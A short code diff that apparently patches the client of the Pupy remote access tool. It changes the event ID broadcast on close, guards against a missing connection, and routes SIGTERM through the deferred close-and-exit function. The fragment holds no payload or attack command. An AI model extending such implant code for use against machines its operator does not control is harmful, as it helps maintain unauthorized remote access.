@@ -145,13 +145,17 @@ if not sys.platform == 'win32' and not pupy.pseudo:
 
 def defered_close_exit(connection):
     try:
-        broadcast_event(0x20000000 | 0xFFFF)
+        # Should be the custom event, as generated on client
+        broadcast_event(0x10000000 | 0xFFFF)
     except Exception, e:
         logger.exception(e)
 
     logger.debug('Defered close+exit')
+
     sys.terminated = True
-    connection.close()
+
+    if connection:
+        connection.close()
 
 def broadcast_event(eventid):
     if pupy.connection:
@@ -757,7 +761,7 @@ def handle_sigterm(signal, frame):
             defered_close_exit,
             pupy.connection)
     else:
-        sys.terminated = True
+        defered_close_exit(None)
 
     logger.warning('SIGTERM HANDLED')
 
